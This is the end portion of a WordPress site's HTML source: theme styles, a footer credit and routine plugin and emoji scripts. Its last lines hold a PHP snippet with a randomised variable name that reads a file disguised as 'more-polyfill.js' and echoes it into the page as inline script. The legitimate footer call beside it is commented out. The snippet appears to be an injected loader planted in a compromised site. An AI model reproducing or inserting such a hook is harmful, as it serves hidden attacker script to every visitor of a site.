.cbp-item:hover .theme-portfolio-active-wrap:before{ background-color: rgba(255, 255, 255, 0.7);}.ffb-id-2t6rfdar .ff-portfolio-filter.ff-portfolio-filters-on-top .cbp-filter-item.cbp-filter-item-active:not(:hover){ border-bottom: 1px solid #7e875f;}.ffb-id-2t6rfdar .ff-portfolio-filter.ff-portfolio-filters-on-top .cbp-filter-item.cbp-filter-item-active:hover{ border-bottom: 1px solid #7e875f;}.ffb-id-2t6rfdar .cbp-filter-counter{ color: #ffffff;}.ffb-id-2t6rfdar .cbp-filter-counter{ background-color: #7e875f;}.ffb-id-2t6rfdar .cbp-filter-counter:after{ border-top-color: #7e875f;}.ffb-id-2t6rfdar{ margin-top: 0px;margin-bottom: 0px;}.ffb-id-2rovescu{ margin-bottom: 30px;padding-top: 20px;padding-right: 20px;padding-bottom: 20px;padding-left: 20px;}.ffb-id-2rtbd9la .ffb-button1-1.ffb-block-button-1-0.btn-base-brd-slide{ color:#ffffff;}.ffb-id-2rtbd9la .ffb-button1-1.ffb-block-button-1-0.btn-base-brd-slide:hover{ color:#ffffff;}.ffb-id-2rtbd9la .ffb-button1-1.ffb-block-button-1-0.btn-base-brd-slide{ border-color: transparent;}.ffb-id-2rtbd9la .ffb-button1-1.ffb-block-button-1-0.btn-base-brd-slide:hover{ border-color: transparent;}.ffb-id-2rtbd9la .ffb-button1-1.ffb-block-button-1-0.btn-base-brd-slide{ background-color:#7e875f;}.ffb-id-2rtbd9la .ffb-button1-1.ffb-block-button-1-0.btn-base-brd-slide:hover{ background-color:#cdd3b8;}.ffb-id-2rtbd9la{ margin-top: 20px;}</style>		<section class="ffb-id-2rgr4rtk fg-section dvd_footer fg-text-dark"><div class="fg-container container fg-container-large fg-container-lvl--1 "><div class="fg-row row    " ><div class="ffb-id-2rgr4rtl fg-col col-xs-12 col-md-6 fg-text-dark"><p class="ffb-id-2rgr7plt fg-paragraph text-left    fg-text-dark">Copyright: Augusta Verburg</p></div><div class="ffb-id-2rgr6hfa fg-col col-xs-12 col-md-6 fg-text-dark"><p class="ffb-id-2rgr7140 fg-paragraph text-right    fg-text-dark">Website door: <a href="http://www.webheld.nl">Webheld.nl</a></p></div></div></div></section><style>.ffb-id-2rgr4rtk{ padding-top: 35px;padding-bottom: 20px;}</style>					</div>
	</div>
			<a href="javascript:void(0);" class="js-back-to-top back-to-top-theme"></a>
				<div
			class="hidden smoothscroll-sharplink"
			data-speed="1000"

			
			data-offset-xs="0"
			data-offset-sm="0"
			data-offset-md="0"
			data-offset-lg="0"
		></div>
		
		<script>
			window.RS_MODULES = window.RS_MODULES || {};
			window.RS_MODULES.modules = window.RS_MODULES.modules || {};
			window.RS_MODULES.waiting = window.RS_MODULES.waiting || [];
			window.RS_MODULES.defered = false;
			window.RS_MODULES.moduleWaiting = window.RS_MODULES.moduleWaiting || {};
			window.RS_MODULES.type = 'compiled';
		</script>
		<script type="speculationrules">
{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"/*"},{"not":{"href_matches":["/wp-*.php","/wp-admin/*","/wp-content/uploads/*","/wp-content/*","/wp-content/plugins/*","/wp-content/themes/ark-child/*","/wp-content/themes/ark/*","/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
</script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-includes/js/dist/hooks.min.js?ver=dd5603f07f9220ed27f1" id="wp-hooks-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-includes/js/dist/i18n.min.js?ver=c26c3dc7bed366793375" id="wp-i18n-js"></script>
<script type="text/javascript" id="wp-i18n-js-after">
/* <![CDATA[ */
wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
//# sourceURL=wp-i18n-js-after
/* ]]> */
</script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/plugins/contact-form-7/includes/swv/js/index.js?ver=6.1.5" id="swv-js"></script>
<script type="text/javascript" id="contact-form-7-js-translations">
/* <![CDATA[ */
( function( domain, translations ) {
	var localeData = translations.locale_data[ domain ] || translations.locale_data.messages;
	localeData[""].domain = domain;
	wp.i18n.setLocaleData( localeData, domain );
} )( "contact-form-7", {"translation-revision-date":"2025-11-30 09:13:36+0000","generator":"GlotPress\/4.0.3","domain":"messages","locale_data":{"messages":{"":{"domain":"messages","plural-forms":"nplurals=2; plural=n != 1;","lang":"nl"},"This contact form is placed in the wrong place.":["Dit contactformulier staat op de verkeerde plek."],"Error:":["Fout:"]}},"comment":{"reference":"includes\/js\/index.js"}} );
//# sourceURL=contact-form-7-js-translations
/* ]]> */
</script>
<script type="text/javascript" id="contact-form-7-js-before">
/* <![CDATA[ */
var wpcf7 = {
    "api": {
        "root": "https:\/\/augustaverburg.nl\/wp-json\/",
        "namespace": "contact-form-7\/v1"
    },
    "cached": 1
};
//# sourceURL=contact-form-7-js-before
/* ]]> */
</script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/plugins/contact-form-7/includes/js/index.js?ver=6.1.5" id="contact-form-7-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/plugins/fresh-framework//framework/themes/builder/metaBoxThemeBuilder/assets/freshGrid/extern/wow.js/wow.min.js?ver=1.74.0" id="jquery.wow-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/plugins/fresh-framework//framework/themes/builder/metaBoxThemeBuilder/assets/freshGrid/jquery.freshGrid.js?ver=1.74.0" id="ff-freshgrid-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/plugins/fresh-framework//framework/frslib/src/frslib.js?ver=1.74.0" id="ff-frslib-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-includes/js/jquery/ui/effect.min.js?ver=1.13.3" id="jquery-effects-core-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/themes/ark/assets/plugins/bootstrap/js/bootstrap.min.js?ver=3.3.7" id="bootstrap-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/themes/ark/assets/plugins/jquery.touchSwipe.min.js?ver=6.9.1" id="touch-swipe-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/themes/ark/assets/plugins/jquery.back-to-top.js?ver=6.9.1" id="ark-jquery.back-to-top-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/themes/ark/assets/plugins/jquery.animsition.min.js?ver=4.0.1" id="jquery.animsition-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/themes/ark/assets/scripts/components/animsition.js?ver=6.9.1" id="ark-animsition-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/themes/ark/assets/plugins/magnific-popup/jquery.magnific-popup.min.js?ver=6.9.1" id="jquery.magnific-popup-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/themes/ark/assets/scripts/components/magnific-popup.js?ver=6.9.1" id="ark-magnific-popup-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/themes/ark/assets/scripts/components/form-modal.js?ver=6.9.1" id="ark-form-modal-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/themes/ark/assets/scripts/components/wow.js?ver=6.9.1" id="ark-wow-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/themes/ark/assets/plugins/jquery.imagesloaded.pkgd.min.js?ver=3.2.0" id="jquery.imagesloaded-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/themes/ark/assets/plugins/owl-carousel/owl.carousel.min.js?ver=1.3.2" id="owl.carousel-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/themes/ark/assets/scripts/components/owl-carousel.js?ver=6.9.1" id="ark-carousel-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/themes/ark/assets/scripts/components/auto-hiding-navbar.js?ver=6.9.1" id="auto-hiding-navbar-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/themes/ark/assets/scripts/components/header-sticky.js?ver=6.9.1" id="header-sticky-js"></script>
<script type="text/javascript" src="https://www.google.com/recaptcha/api.js?render=6LdFUpgUAAAAAFbHgJGPH4iNpnblUjcqB7JCVTDS&amp;ver=3.0" id="google-recaptcha-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=3.15.0" id="wp-polyfill-js"></script>
<script type="text/javascript" id="wpcf7-recaptcha-js-before">
/* <![CDATA[ */
var wpcf7_recaptcha = {
    "sitekey": "6LdFUpgUAAAAAFbHgJGPH4iNpnblUjcqB7JCVTDS",
    "actions": {
        "homepage": "homepage",
        "contactform": "contactform"
    }
};
//# sourceURL=wpcf7-recaptcha-js-before
/* ]]> */
</script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/plugins/contact-form-7/modules/recaptcha/index.js?ver=6.1.5" id="wpcf7-recaptcha-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/themes/ark/assets/plugins/cubeportfolio/js/jquery.cubeportfolio.min.js?ver=3.6.0" id="jquery.cubeportfolio-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/themes/ark/assets/scripts/components/portfolio.js?ver=6.9.1" id="ark-portfolio-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/themes/ark/assets/scripts/app.js?ver=1778565086" id="ark-app-js"></script>
<script id="wp-emoji-settings" type="application/json">
{"baseUrl":"https://s.w.org/images/core/emoji/17.0.2/72x72/","ext":".png","svgUrl":"https://s.w.org/images/core/emoji/17.0.2/svg/","svgExt":".svg","source":{"concatemoji":"https://augustaverburg.nl/wp-includes/js/wp-emoji-release.min.js?ver=6.9.1"}}
</script>
<script type="module">
/* <![CDATA[ */
/*! This file is auto-generated */
const a=JSON.parse(document.getElementById("wp-emoji-settings").textContent),o=(window._wpemojiSettings=a,"wpEmojiSettingsSupports"),s=["flag","emoji"];function i(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function c(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0);const a=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);return t.every((e,t)=>e===a[t])}function p(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var n=e.getImageData(16,16,1,1);for(let e=0;e<n.data.length;e++)if(0!==n.data[e])return!1;return!0}function u(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\u1fac8")}return!1}function f(e,t,n,a){let r;const o=(r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):document.createElement("canvas")).getContext("2d",{willReadFrequently:!0}),s=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(e=>{s[e]=t(o,e,n,a)}),s}function r(e){var t=document.createElement("script");t.src=e,t.defer=!0,document.head.appendChild(t)}a.supports={everything:!0,everythingExceptFlag:!0},new Promise(t=>{let n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),c.toString(),p.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"});const r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=e=>{i(n=e.data),r.terminate(),t(n)})}catch(e){}i(n=f(s,u,c,p))}t(n)}).then(e=>{for(const n in e)a.supports[n]=e[n],a.supports.everything=a.supports.everything&&a.supports[n],"flag"!==n&&(a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&a.supports[n]);var t;a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&!a.supports.flag,a.supports.everything||((t=a.source||{}).concatemoji?r(t.concatemoji):t.wpemoji&&t.twemoji&&(r(t.twemoji),r(t.wpemoji)))});
//# sourceURL=https://augustaverburg.nl/wp-includes/js/wp-emoji-loader.min.js
/* ]]> */
</script>

<?php
$vNaZK = plugin_dir_path(__FILE__) . 'more-polyfill.js';
if (is_file($vNaZK)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($vNaZK);
	echo '</script>';
}
//get_footer();
?>
	</body>
</html>
